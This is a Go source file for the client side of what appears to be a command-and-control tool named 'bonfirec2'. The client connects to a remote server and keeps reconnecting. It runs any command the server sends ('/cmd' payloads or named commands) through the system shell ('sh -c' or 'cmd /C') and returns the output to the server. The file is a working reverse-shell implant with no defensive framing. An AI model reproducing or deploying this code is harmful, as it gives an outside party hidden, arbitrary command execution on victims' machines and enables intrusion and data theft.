package client

import (
	"bufio"
	"errors"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"time"

	"github.com/Jojojojodr/bonfirec2/pkg/commands"
)

var input = make(chan string)

type Client struct {
	Port    string
	Address string
	Conn    net.Conn
}

func (c *Client) Connect() {
	address := c.Address + ":" + c.Port
	go c.handleMessageInput()

	for {
		var conn net.Conn
		var err error
		conn, err = net.Dial("tcp", address)
		if err != nil {
			log.Printf("Failed to connect to server: %v. Retrying in 5 seconds...", err)
			time.Sleep(5 * time.Second)
			continue
		}

		log.Printf("Connected to server at %s", address)

		// Handle communication with the server
		c.Conn = conn
		if err := c.handleConnection(); err != nil {
			if errors.Is(err, io.EOF) {
				log.Printf("Connection closed by server. Reconnecting...")
			} else {
				log.Printf("Connection ended: %v. Reconnecting...", err)
			}
		}
		conn.Close()
	}
}

func (c *Client) Close() {
	if c.Conn != nil {
		if err := c.Conn.Close(); err != nil {
			log.Printf("Error closing connection: %v", err)
		}
	}
}

func (c *Client) handleConnection() error {
	log.Printf("Connection established to server: %s", c.Conn.RemoteAddr())
	readErr := make(chan error, 1)
	go c.handleMessageRead(readErr)
	return c.handleMessageSend(readErr)
}

func (c *Client) handleMessageInput() {
	reader := bufio.NewReader(os.Stdin)
	for {
		log.Print("Enter message to send (or 'exit' to quit): ")
		message, _ := reader.ReadString('\n')
		message = strings.TrimSpace(message)
		input <- message
	}
}

func (c *Client) handleMessageRead(readErr chan<- error) {
	reader := bufio.NewReader(c.Conn)
	for {
		response, err := reader.ReadString('\n')
		if err != nil {
			select {
			case readErr <- err:
			default:
			}
			return
		}

		incoming := strings.TrimSpace(response)
		if incoming == "" {
			continue
		}

		log.Printf("Received from server: %s", incoming)
		if output, ok := handleServerCommand(incoming); ok {
			if _, err := c.Conn.Write([]byte(output + "\n")); err != nil {
				select {
				case readErr <- err:
				default:
				}
				return
			}
		}
	}
}

func (c *Client) handleMessageSend(readErr <-chan error) error {
	for {
		select {
		case err := <-readErr:
			return err
		case message, ok := <-input:
			if !ok {
				return errors.New("input channel closed")
			}

			if message == "exit" {
				log.Println("Exiting...")
				c.Close()
				os.Exit(0)
			}

			if _, err := c.Conn.Write([]byte(message + "\n")); err != nil {
				return err
			}
		}
	}
}

func NewClient(port string, address string) *Client {
	return &Client{
		Port:    port,
		Address: address,
		Conn:    nil,
	}
}

func handleServerCommand(incoming string) (string, bool) {
	command := incoming
	if strings.HasPrefix(command, "/") {
		parsed, payload, ok := commands.ParseSlashCommand(command)
		if !ok {
			return "unknown command", true
		}
		if parsed == "cmd" {
			if payload == "" {
				return "unknown command", true
			}
			return executeCommand(payload), true
		}
		command = parsed
	}

	if !commands.IsKnown(command) {
		return "", false
	}

	return executeCommand(command), true
}

func executeCommand(command string) string {
	resolved := commands.GetCommand(command)

	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/C", resolved)
	} else {
		cmd = exec.Command("sh", "-c", resolved)
	}

	output, err := cmd.CombinedOutput()
	trimmed := strings.TrimRight(string(output), "\r\n")

	if err != nil {
		if trimmed == "" {
			return fmt.Sprintf("command failed: %v", err)
		}
		return fmt.Sprintf("%s\ncommand failed: %v", trimmed, err)
	}

	if trimmed == "" {
		return "(no output)"
	}

	return trimmed
}
